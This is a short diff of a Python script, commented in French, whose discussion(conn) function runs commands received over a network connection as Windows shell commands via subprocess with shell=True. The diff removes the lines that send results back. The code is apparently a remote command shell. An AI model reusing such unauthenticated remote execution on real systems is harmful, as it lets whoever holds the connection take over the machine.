@@ -90,11 +90,7 @@ def discussion(conn):
             elif b.lower() =="dos":
                 try:
                     reply =subprocess.check_output(a, shell=True).decode('cp850').strip()
-                    conn.send(reply.encode())
 
-                    if reply == "":
-                        reply = "Commande exécuté et réussi "
-                        conn.send(reply.encode())
                 except:
                     reply="Commande non interprété du à des fautes d'orthographes ou non existante"
                     conn.send(reply.encode())
